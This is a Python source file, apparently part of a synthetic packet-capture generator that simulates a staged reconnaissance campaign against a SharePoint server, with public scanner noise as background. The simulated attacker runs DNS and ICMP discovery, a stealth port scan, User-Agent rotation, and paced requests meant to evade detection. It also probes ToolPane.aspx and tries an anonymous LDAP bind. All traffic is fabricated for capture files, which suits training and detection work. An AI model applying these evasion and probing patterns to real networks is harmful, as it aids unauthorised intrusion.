    pkt = create_tcp_psh_ack(dst_ip, src_ip, dport, sport, conn_server.seq, conn.seq, 65535, response.encode(), current_time)
    packets.append(pkt)
    conn_server.seq += len(response)
    current_time += random.uniform(0.01, 0.03)

    # Client ACK
    pkt = create_tcp_ack(src_ip, dst_ip, sport, dport, conn.seq, conn_server.seq, 65535, current_time)
    packets.append(pkt)

    # FIN handshake
    packets.extend(tcp_fin_handshake(src_ip, dst_ip, sport, dport, current_time))

    return packets


# ---
# Reconnaissance traffic modeled as a public source (203.0.113.22).
# ---
def generate_attacker_phase1_discovery(attacker_ip, target_ip, dc_ip, start_time):
    """Phase 1: Initial Discovery (0-8 minutes)"""
    logger.info("    Phase 1: Initial Discovery (DNS, ICMP)")
    packets = []
    current_time = start_time

    # ICMP ping to SharePoint
    identifier = random_pool.ip_id()
    for seq in range(1, 5):
        # Echo Request
        req = generate_icmp_ping(attacker_ip, target_ip, seq, identifier, current_time)
        packets.append(req)

        # Echo Reply (0.5-2ms RTT)
        reply_time = current_time + random.uniform(0.0005, 0.002)
        reply = generate_icmp_reply(target_ip, attacker_ip, seq, identifier, reply_time)
        packets.append(reply)

        current_time += 1.0  # 1 second between pings

    current_time += random.uniform(10, 30)

    # DNS reconnaissance
    domains_to_query = ["corp.local", "sharepoint.corp.local", "sp-srv01.corp.local", "sql-srv01.corp.local", "dc01.corp.local"]

    for domain in domains_to_query:
        sport = generator.allocate_port(attacker_ip)

        # DNS query
        query, txid, _ = generate_dns_query(attacker_ip, dc_ip, domain, "A", current_time)
        packets.append(query)

        # DNS response (20-80ms later)
        resp_time = current_time + random.uniform(0.020, 0.080)
        response = generate_dns_response(dc_ip, attacker_ip, sport, domain, txid, "A", resp_time)
        packets.append(response)

        current_time += random.uniform(15, 45)  # Slow, patient

    return packets


def generate_attacker_phase2_portscan(attacker_ip, target_ip, start_time):
    """Phase 2: Port Scanning (8-15 minutes)"""
    logger.info("    Phase 2: Port Scanning")
    packets = []
    current_time = start_time + (8 * 60)  # Start at 8 minutes

    ports_to_scan = [80, 443, 8080, 3389, 445, 135, 1433, 3306, 5432]

    for port in ports_to_scan:
        sport = generator.allocate_port(attacker_ip)

        # SYN packet
        syn = create_tcp_syn(attacker_ip, target_ip, sport, port, current_time)
        packets.append(syn)

        # Response (SYN-ACK or RST)
        resp_time = current_time + random.uniform(0.010, 0.050)
        if port in [8080, 3389, 445, 135]:  # Open ports
            # SYN-ACK
            syn_ack = create_tcp_synack(target_ip, attacker_ip, port, sport, random_pool.seq_num(), syn[TCP].seq + 1, resp_time)
            packets.append(syn_ack)

            # RST to close (stealth scan - don't complete handshake)
            rst_time = resp_time + random_pool.delay_medium()
            rst = create_tcp_rst(attacker_ip, target_ip, sport, port, syn[TCP].seq + 1, rst_time)
            packets.append(rst)
        else:  # Closed ports
            # RST
            rst = create_tcp_rst(target_ip, attacker_ip, port, sport, 0, resp_time)
            packets.append(rst)

        if random.random() < 0.7:
            current_time += random.uniform(2, 8)  # Normal pace
        else:
            current_time += random.uniform(20, 60)  # Slow down to evade detection

    return packets


def generate_attacker_phase3_enumeration(attacker_ip, target_ip, start_time):
    """Phase 3: Web Enumeration (15-28 minutes)"""
    logger.info("    Phase 3: Web Enumeration (/_vti_bin/, /_api/, /_layouts/)")
    packets = []
    current_time = start_time + (15 * 60)  # Start at 15 minutes

    # User agents to rotate
    # Attacker rotates User-Agents to evade detection
    attacker_user_agents = [generate_realistic_user_agent() for _ in range(4)]

    # Endpoints to probe
    endpoints = [
        ("/", "GET", 302),
        ("/robots.txt", "GET", 404),
        ("/favicon.ico", "GET", 200),
        ("/_vti_inf.html", "GET", 200),
        ("/_vti_bin/", "GET", 403),
        ("/_vti_bin/owssvr.dll", "GET", 200),
        ("/_vti_bin/lists.asmx", "GET", 200),
        ("/_vti_bin/client.svc", "GET", 200),
        ("/_layouts/", "GET", 302),
        ("/_layouts/15/", "GET", 302),
        ("/_layouts/15/start.aspx", "GET", 401),
        ("/_api/", "GET", 401),
        ("/_api/web", "GET", 401),
        ("/_api/contextinfo", "POST", 403),
        ("/nonexistent.aspx", "GET", 404),
    ]

    for endpoint, method, expected_status in endpoints:
        sport = generator.allocate_port(attacker_ip)

        # TCP handshake
        handshake = tcp_handshake(attacker_ip, target_ip, sport, 8080, current_time)
        packets.extend(handshake)
        current_time += random_pool.delay_handshake()

        conn = generator.get_connection(attacker_ip, target_ip, sport, 8080)
        conn_server = generator.get_connection(target_ip, attacker_ip, 8080, sport)

        # HTTP request
        user_agent = random.choice(attacker_user_agents)
        request_text = f"{method} {endpoint} HTTP/1.1\r\n"
        request_text += f"Host: {SHAREPOINT_HOSTNAME}:8080\r\n"
        request_text += f"User-Agent: {user_agent}\r\n"
        request_text += "Accept: */*\r\n"
        if method == "POST":
            request_text += "Content-Length: 0\r\n"
        request_text += "\r\n"
        request = request_text.encode()

        pkt = create_tcp_psh_ack(attacker_ip, target_ip, sport, 8080, conn.seq, conn.ack, 65535, request, current_time)
        packets.append(pkt)
        conn.seq += len(request)
        current_time += exponential_delay(0.005, 0.030, 50)

        # Server ACK
        pkt = create_tcp_ack(target_ip, attacker_ip, 8080, sport, conn_server.seq, conn.seq, 65535, current_time)
        packets.append(pkt)
        current_time += exponential_delay(0.010, 0.050, 30)

        # HTTP response
        content_length = random_pool.small_int() if expected_status == 200 else random.randint(50, 300)
        response = generate_http_response(expected_status, content_length, attacker_ip, endpoint, current_time)

        pkt = create_tcp_psh_ack(target_ip, attacker_ip, 8080, sport, conn_server.seq, conn.seq, 65535, response, current_time)

        packets.append(pkt)
        conn_server.seq += len(response)
        conn.ack = conn_server.seq
        current_time += exponential_delay(0.005, 0.015, 100)

        # Client ACK
        pkt = create_tcp_ack(attacker_ip, target_ip, sport, 8080, conn.seq, conn.ack, 65535, current_time)
        packets.append(pkt)
        current_time += exponential_delay(0.001, 0.005, 200)

        # FIN handshake (close connection)
        fin1 = create_tcp_fin_ack(attacker_ip, target_ip, sport, 8080, conn.seq, conn.ack, 65535, current_time)
        packets.append(fin1)
        current_time += exponential_delay(0.001, 0.005, 200)

        fin2 = create_tcp_fin_ack(target_ip, attacker_ip, 8080, sport, conn_server.seq, conn.seq + 1, 65535, current_time)
        packets.append(fin2)
        current_time += exponential_delay(0.001, 0.005, 200)

        ack = create_tcp_ack(attacker_ip, target_ip, sport, 8080, conn.seq + 1, conn_server.seq + 1, 65535, current_time)
        packets.append(ack)

        # Variable delay between requests (3-20 seconds)
        current_time += random.uniform(3, 20)

    return packets


def generate_attacker_phase4_targeted(attacker_ip, target_ip, start_time):
    """Phase 4: Targeted Probing (28-40 minutes)"""
    logger.info("    Phase 4: Targeted Probing (ToolPane.aspx exploitation attempts)")
    packets = []
    current_time = start_time + (28 * 60)  # Start at 28 minutes

    # Aggressive probing of ToolPane.aspx
    toolpane_payloads = [
        ("/_vti_bin/ToolPane.aspx", "POST", "", 500),  # Empty body
        ("/_vti_bin/ToolPane.aspx", "POST", '<?xml version="1.0"?><test/>', 500),  # Test XML
        ("/_vti_bin/ToolPane.aspx", "POST", "<malformed", 500),  # Malformed
        ("/_vti_bin/ToolPane.aspx", "GET", "", 405),  # Method not allowed
        ("/_layouts/15/viewlsts.aspx", "GET", "", 401),
        ("/_api/web/lists", "GET", "", 401),
        ("/_vti_bin/client.svc/ProcessQuery", "POST", "<Request></Request>", 401),
        ("/_api/search/query?querytext='test'", "GET", "", 401),
    ]

    for endpoint, method, body, expected_status in toolpane_payloads:
        sport = generator.allocate_port(attacker_ip)

        # TCP handshake
        handshake = tcp_handshake(attacker_ip, target_ip, sport, 8080, current_time)
        packets.extend(handshake)
        current_time += random_pool.delay_handshake()

        conn = generator.get_connection(attacker_ip, target_ip, sport, 8080)
        conn_server = generator.get_connection(target_ip, attacker_ip, 8080, sport)

        # HTTP request with payload
        request_text = f"{method} {endpoint} HTTP/1.1\r\n"
        request_text += f"Host: {SHAREPOINT_HOSTNAME}:8080\r\n"
        request_text += "User-Agent: python-requests/2.31.0\r\n"
        request_text += "Accept: */*\r\n"
        if body:
            request_text += f"Content-Length: {len(body)}\r\n"
            request_text += "Content-Type: application/xml\r\n"
            request_text += "\r\n"
            request_text += body
        else:
            request_text += "\r\n"

        request = request_text.encode()

        pkt = create_tcp_psh_ack(attacker_ip, target_ip, sport, 8080, conn.seq, conn.ack, 65535, request, current_time)
        packets.append(pkt)
        conn.seq += len(request)
        current_time += exponential_delay(0.005, 0.030, 50)

        # Server response
        response = generate_http_response(expected_status, random.randint(50, 500), attacker_ip, endpoint, current_time)
        pkt = create_tcp_psh_ack(target_ip, attacker_ip, 8080, sport, conn_server.seq, conn.seq, 65535, response, current_time)
        packets.append(pkt)

        # Close connection
        current_time += random_pool.delay_handshake()

        # Timing: 5-25 seconds between requests
        current_time += random.uniform(5, 25)

    # LDAP enumeration attempt
    sport = generator.allocate_port(attacker_ip)

    # Try anonymous LDAP bind
    handshake = tcp_handshake(attacker_ip, DOMAIN_CONTROLLER_IP, sport, 389, current_time)
    packets.extend(handshake)
    current_time += random.uniform(0.010, 0.030)

    conn = generator.get_connection(attacker_ip, DOMAIN_CONTROLLER_IP, sport, 389)

    # Anonymous bind
    anon_bind = b"\x30\x0c\x02\x01\x01\x60\x07\x02\x01\x03\x04\x00\x80\x00"
    pkt = create_tcp_psh_ack(attacker_ip, DOMAIN_CONTROLLER_IP, sport, 389, conn.seq, conn.ack, 65535, anon_bind, current_time)
    packets.append(pkt)
    current_time += random.uniform(0.010, 0.030)

    # Response: invalidCredentials
    bind_resp = b"\x30\x0c\x02\x01\x01\x61\x07\x0a\x01\x31\x04\x00\x04\x00"
    conn_server = generator.get_connection(DOMAIN_CONTROLLER_IP, attacker_ip, 389, sport)
    pkt = create_tcp_psh_ack(DOMAIN_CONTROLLER_IP, attacker_ip, 389, sport, conn_server.seq, conn.seq + len(anon_bind), 65535, bind_resp, current_time)
    packets.append(pkt)

    return packets


def generate_attacker_phase5_blending(attacker_ip, target_ip, start_time, duration):
    """Phase 5: Persistence and Blending (40-90 minutes)"""
    logger.info("    Phase 5: Persistence and Blending (slow reconnaissance)")
    packets = []
    current_time = start_time + (40 * 60)  # Start at 40 minutes

    # Slow, sporadic requests that blend with normal traffic
    blend_endpoints = [
        ("/_layouts/15/start.aspx", "GET", 401),
        ("/_api/web", "GET", 401),
        ("/_vti_bin/ToolPane.aspx", "POST", 500),
        ("/sites/IT/_api/web", "GET", 401),
        ("/_api/sitepages/pages", "GET", 401),
        ("/sites/IT/SitePages/Home.aspx", "GET", 401),
        ("/_layouts/15/viewlsts.aspx", "GET", 401),
    ]

    request_count = 0
    max_requests = 30  # ~30 requests over 50 minutes

    while current_time < start_time + duration and request_count < max_requests:
        endpoint, method, status = random.choice(blend_endpoints)
        sport = generator.allocate_port(attacker_ip)

        # TCP handshake
        handshake = tcp_handshake(attacker_ip, target_ip, sport, 8080, current_time)
        packets.extend(handshake)
        current_time += random_pool.delay_handshake()

        conn = generator.get_connection(attacker_ip, target_ip, sport, 8080)
        conn_server = generator.get_connection(target_ip, attacker_ip, 8080, sport)

        # HTTP request (looks more legitimate)
        user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/118.0.0.0"
        request_text = f"{method} {endpoint} HTTP/1.1\r\n"
        request_text += f"Host: {SHAREPOINT_HOSTNAME}:8080\r\n"
        request_text += f"User-Agent: {user_agent}\r\n"
        request_text += "Accept: */*\r\n"
        if method == "POST":
            request_text += "Content-Length: 0\r\n"
        request_text += "\r\n"
        request = request_text.encode()

        pkt = create_tcp_psh_ack(attacker_ip, target_ip, sport, 8080, conn.seq, conn.ack, 65535, request, current_time)
        packets.append(pkt)
        conn.seq += len(request)
        current_time += exponential_delay(0.010, 0.050, 50)

        # Response
        response = generate_http_response(status, random_pool.small_int(), attacker_ip, endpoint, current_time)
        pkt = create_tcp_psh_ack(target_ip, attacker_ip, 8080, sport, conn_server.seq, conn.seq, 65535, response, current_time)
        packets.append(pkt)

        request_count += 1

        # Long delay between requests (20-120 seconds)
        current_time += random.uniform(20, 120)

    return packets


# ---
# PUBLIC INTERNET SCANNER TRAFFIC (Realistic Background Noise)
# ---
def generate_single_scanner_request(scanner_ip, target_ip, target_port, endpoint_tuple, timestamp):
    """Generate a single HTTP scanner request to SharePoint"""
    method, uri, expected_status = endpoint_tuple
    packets = []
    current_time = timestamp

    sport = generator.allocate_port(scanner_ip)

    # TCP handshake
    packets.extend(tcp_handshake(scanner_ip, target_ip, sport, target_port, current_time))
    current_time += random.uniform(0.010, 0.050)

    conn = generator.get_connection(scanner_ip, target_ip, sport, target_port)
    conn_server = generator.get_connection(target_ip, scanner_ip, target_port, sport)

    # HTTP request with scanner user-agent
    user_agent = random.choice(SCANNER_USER_AGENTS)

    request_text = f"{method} {uri} HTTP/1.1\r\n"
    request_text += f"Host: {target_ip}:{target_port}\r\n"
    request_text += f"User-Agent: {user_agent}\r\n"
    request_text += "Accept: */*\r\n"
    request_text += "Connection: close\r\n"  # Scanners usually close connection

    if method == "POST":
        # Empty or minimal POST body (scanner probing)
        post_body = ""
        if "ToolPane" in uri or "client.svc" in uri:
            # Some scanners send minimal XML/SOAP
            post_body = "<Request></Request>"

        if post_body:
            request_text += "Content-Type: application/xml\r\n"
            request_text += f"Content-Length: {len(post_body)}\r\n"
            request_text += "\r\n"
            request_text += post_body
        else:
            request_text += "Content-Length: 0\r\n"
            request_text += "\r\n"
    else:
        request_text += "\r\n"

    request = request_text.encode()

    pkt = create_tcp_psh_ack(scanner_ip, target_ip, sport, target_port, conn.seq, conn.ack, 65535, request, current_time)
    packets.append(pkt)
    conn.seq += len(request)
    current_time += exponential_delay(0.010, 0.050, 50)

    # Server ACK
    pkt = create_tcp_ack(target_ip, scanner_ip, target_port, sport, conn_server.seq, conn.seq, 65535, current_time)
    packets.append(pkt)
    current_time += exponential_delay(0.020, 0.100, 30)

    iis_version, aspnet_version = generator.get_server_versions("10.3.10.11")

    # HTTP response
    response_text = f"HTTP/1.1 {expected_status} "
    status_messages = {200: "OK", 302: "Found", 401: "Unauthorized", 403: "Forbidden", 404: "Not Found", 400: "Bad Request"}
    response_text += status_messages.get(expected_status, "OK") + "\r\n"
    response_text += "Content-Type: text/html; charset=utf-8\r\n"
    response_text += f"Server: {iis_version}\r\n"
    response_text += f"X-SharePointHealthScore: {generate_sharepoint_health_score()}\r\n"
    response_text += "X-Powered-By: ASP.NET\r\n"

    if expected_status == 302:
        response_text += "Location: /_layouts/15/start.aspx\r\n"

    content_length = random_pool.small_int() if expected_status == 200 else random.randint(50, 300)
    response_text += f"Content-Length: {content_length}\r\n"
    response_text += "Connection: close\r\n"
    response_text += "\r\n"
    response_text += "<!-- Response body -->"

    response = response_text.encode()

    pkt = create_tcp_psh_ack(target_ip, scanner_ip, target_port, sport, conn_server.seq, conn.seq, 65535, response, current_time)
    packets.append(pkt)
    conn_server.seq += len(response)
    conn.ack = conn_server.seq
    current_time += exponential_delay(0.005, 0.015, 100)

    # Client ACK
    pkt = create_tcp_ack(scanner_ip, target_ip, sport, target_port, conn.seq, conn.ack, 65535, current_time)
    packets.append(pkt)
    current_time += exponential_delay(0.001, 0.005, 200)

    # FIN handshake (scanners close connections)
    fin1 = create_tcp_fin_ack(scanner_ip, target_ip, sport, target_port, conn.seq, conn.ack, 65535, current_time)
    packets.append(fin1)
    current_time += exponential_delay(0.001, 0.005, 200)

    fin2 = create_tcp_fin_ack(target_ip, scanner_ip, target_port, sport, conn_server.seq, conn.seq + 1, 65535, current_time)
    packets.append(fin2)
    current_time += exponential_delay(0.001, 0.005, 200)

    ack = create_tcp_ack(scanner_ip, target_ip, sport, target_port, conn.seq + 1, conn_server.seq + 1, 65535, current_time)
    packets.append(ack)

    return packets


def generate_public_scanner_traffic(start_time, duration, serializer: FastPacketSerializer | None = None):
    """Generate realistic public scanner traffic from multiple IPs"""
    logger.info("[+] Generating public internet scanner traffic...")

    use_serializer = serializer is not None
    all_packets = []

    # Each scanner IP gets a behavior profile
    scanner_profiles = []
    for scanner_ip in PUBLIC_SCANNER_IPS:
        behavior_type = random.choice(["aggressive", "moderate", "moderate", "slow", "slow"])
        behavior = SCANNER_BEHAVIORS[behavior_type]

        scanner_profiles.append(
            {
                "ip": scanner_ip,
                "behavior": behavior,
                "type": behavior_type,
            }
        )

    logger.info(f"    Simulating {len(scanner_profiles)} public scanners:")

    # Generate traffic for each scanner
    for profile in scanner_profiles:
        scanner_ip = profile["ip"]
        behavior = profile["behavior"]
        behavior_type = profile["type"]

        # How many requests this scanner will make
        num_requests = random.randint(*behavior["requests_per_hour"])

        # Randomly select endpoints to target
        endpoints_to_scan = random.sample(SHAREPOINT_VULNERABLE_ENDPOINTS, min(behavior["endpoints_targeted"], len(SHAREPOINT_VULNERABLE_ENDPOINTS)))

        logger.info(f"      - {scanner_ip} ({behavior_type}): {num_requests} requests over 24h")

        # REALISTIC: Scanners peak during business hours (more targets online)
        for _i in range(num_requests):
            # Weight requests toward business hours (8AM-6PM)
            hour_offset = random.triangular(0, duration, duration * 0.5)  # Peak at midday
            request_time = start_time + hour_offset

            # Pick random endpoint
            endpoint = random.choice(endpoints_to_scan)

            # Generate request
            request_packets = generate_single_scanner_request(scanner_ip, SHAREPOINT_SERVER_IP, 8080, endpoint, request_time)
            all_packets.extend(request_packets)

    # Apply light retransmissions
    all_packets = apply_retransmissions_smart(all_packets, RETRANSMISSION_RATE_OTHER)

    total_requests = sum(random.randint(*SCANNER_BEHAVIORS[random.choice(["aggressive", "moderate", "slow"])]["requests_per_hour"]) for _ in PUBLIC_SCANNER_IPS)
    logger.info(f"    Public scanner traffic: {len(all_packets)} packets (~{total_requests} total requests)")
    # Write packets if serializer provided, otherwise return
    if use_serializer:
        logger.info(f"    Writing {len(all_packets)} Scanner packets to PCAP...")
        for pkt in all_packets:
            serializer.add_packet(pkt, pkt.time)
        return []  # Return empty (already written)
    else:
        return all_packets  # Return for backward compatibility


# ---
# ADDITIONAL PROTOCOL HELPERS (imported from base.py for local use)
# ---
def _emit_packet(
    serializer: FastPacketSerializer | None,
    packets: list,
    pkt,
    timestamp: float,
) -> None:
    """Emit packet to serializer or list."""
    if serializer is not None:
        serializer.add_packet(pkt, timestamp)
    else:
        packets.append(pkt)


def _udp_packet(
    src_ip: str,
    dst_ip: str,
    sport: int,
    dport: int,
    payload: bytes,
    timestamp: float,
    dst_mac: str | None = None,
):
    """Create UDP IPv4 packet."""
    if dst_mac is None:
        dst_mac = get_mac_fast(dst_ip)
    pkt = Ether(src=get_mac_fast(src_ip), dst=dst_mac)
    pkt /= IP(src=src_ip, dst=dst_ip, id=random_pool.ip_id(src_ip, dst_ip))
    pkt /= UDP(sport=sport, dport=dport)
    if payload:
        pkt /= Raw(load=payload)
    pkt.time = timestamp
    return pkt


def _udp6_packet(
    src_ip: str,
    dst_ip: str,
    sport: int,
    dport: int,
    payload: bytes,
    timestamp: float,
    dst_mac: str | None = None,
):
    """Create UDP IPv6 packet."""
    if dst_mac is None:
        dst_mac = "33:33:00:00:00:01"
    pkt = Ether(src=get_mac_fast(src_ip), dst=dst_mac)
    pkt /= IPv6(src=src_ip, dst=dst_ip)
    pkt /= UDP(sport=sport, dport=dport)
    if payload:
        pkt /= Raw(load=payload)
    pkt.time = timestamp
    return pkt


def _simple_tcp_exchange(
    src_ip: str,
    dst_ip: str,
    dport: int,
    start_time: float,
    payload: bytes | str,
    response_payload: bytes | str | None = None,
):
    packets = []
    sport = random_pool.port()
    handshake = tcp_handshake(src_ip, dst_ip, sport, dport, start_time)
    packets.extend(handshake)

    syn = handshake[0]
    syn_ack = handshake[1]
    conn_client = generator.get_connection(src_ip, dst_ip, sport, dport)
    conn_server = generator.get_connection(dst_ip, src_ip, dport, sport)
    conn_server.seq = syn_ack[TCP].seq + 1
    conn_server.ack = syn[TCP].seq + 1
    conn_server.established = True

    current_time = handshake[-1].time + random_pool.delay_small()
    if payload:
        if isinstance(payload, str):
            payload = payload.encode("ascii", "ignore")
        pkt = create_tcp_psh_ack(
            src_ip,
            dst_ip,
            sport,
            dport,
            conn_client.seq,
            conn_client.ack,
            65535,
            payload,
            current_time,
        )
        packets.append(pkt)
        conn_client.seq += len(payload)
        current_time += random_pool.delay_small()
        ack = create_tcp_ack(dst_ip, src_ip, dport, sport, conn_server.seq, conn_client.seq, 65535, current_time)
        packets.append(ack)

    if response_payload:
        current_time += random_pool.delay_small()
        if isinstance(response_payload, str):
            response_payload = response_payload.encode("ascii", "ignore")
        resp = create_tcp_psh_ack(
            dst_ip,
            src_ip,
            dport,
            sport,
            conn_server.seq,
            conn_client.seq,
            65535,
            response_payload,
            current_time,
        )
        packets.append(resp)
        conn_server.seq += len(response_payload)
        current_time += random_pool.delay_small()
        ack2 = create_tcp_ack(src_ip, dst_ip, sport, dport, conn_client.seq, conn_server.seq, 65535, current_time)
        packets.append(ack2)

    return packets


def generate_portal_outbound_software_downloads(start_time, duration, serializer: FastPacketSerializer | None = None):
    """Compatibility wrapper for outbound software downloads."""
    return generate_sharepoint_outbound_software_downloads(start_time, duration, serializer=serializer)


def generate_scanner_recon_requests(src_ip, dst_ip, attacker_domain, start_time, duration):
    """Compatibility wrapper for targeted scanner probes."""
    return generate_sharepoint_recon_requests(src_ip, dst_ip, attacker_domain, start_time, duration)


# ---
# MAIN ORCHESTRATION AND PCAP GENERATION
# ---
